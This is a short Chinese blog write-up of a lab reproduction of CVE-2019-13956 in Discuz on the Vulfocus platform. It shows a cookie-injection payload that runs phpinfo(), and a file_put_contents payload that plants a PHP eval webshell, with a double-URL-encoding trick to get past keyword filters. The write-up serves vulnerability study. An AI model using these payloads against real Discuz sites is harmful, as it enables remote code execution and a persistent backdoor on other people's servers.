# 原创
：  【漏洞复现-Discuz-代码执行】Discuz_CVE-2019-13956

# 【漏洞复现-Discuz-代码执行】Discuz_CVE-2019-13956

**目录**

[一、靶场环境](#%E4%B8%80%E3%80%81%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83)

[1.1、平台：](#1.1%E3%80%81%E5%B9%B3%E5%8F%B0%EF%BC%9A)

[1.2、知识:](#1.2%E3%80%81%E6%BC%8F%E6%B4%9E%E7%89%88%E6%9C%AC%3A)

[1.3、描述：](#1.3%E3%80%81%E6%8F%8F%E8%BF%B0%EF%BC%9A)

[二、漏洞验证](#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81)

[2.1、分析：](#2.1%E3%80%81%E5%88%86%E6%9E%90%EF%BC%9A)

[2.4、解题：](#2.4%E3%80%81%E8%A7%A3%E9%A2%98%EF%BC%9A)

---


## 一、靶场环境

> 
<h3>1.1、平台：</h3>
[Vulfocus 漏洞威胁分析平台](https://vulfocus.cn/)
123.58.224.8:30299







> 
<h3>1.2、知识:</h3>
1、审计
language可控，程序从cookie中获取language的值作为缓存文件名的一部分，且被include_once包含，构成命令执行漏洞
'./data/temlpate/'.'sc'.phpinfo().''_'
2、file_put_contents（'文件名.php','写入文件里面的后门代码'）



> 
<h3>1.3、描述：</h3>
允许远程通过修改过的语言 cookie 执行任意 PHP 代码，如将 xxxx_xxxx_language=en 更改为 xxxx_xxxx_language=en'.phpinfo().' 所示；（如果使用了随机前缀 xxxx_xxxx_）


---


---


## 二、漏洞验证

> 
<h3>2.1、分析：</h3>
一直下一步，同意，啥的



 <img alt="" height="913" src="https://img-blog.csdnimg.cn/61a49eb40dc64400a04677d65af7817d.png" width="1200"/>
 点击访问，与此同时，使用bp抓包<img alt="" height="924" src="https://img-blog.csdnimg.cn/f7209a81d75c427ea1b7975b1cc427d5.png" width="1200"/>
 数据包中cookie中的language时漏洞点

 随便往其中的一个地方插入语句
'.phpinfo().'
发现回显了flag

 在代理上修改后放包<img alt="" height="928" src="https://img-blog.csdnimg.cn/4575c8c47e8e4662bd9fec53e43fd055.png" width="1200"/>

<hr/>
其他方法：
写入后门文件
'.file_put_contents('shell.php','&lt;?php eval($_POST['pw']);?&gt;').'
 （我测试的时候，是会有关键字过滤的）
服务器会自动解码一次，我们就需要进行2次URL编码，来进行绕过


> 
<h3>2.4、解题：</h3>




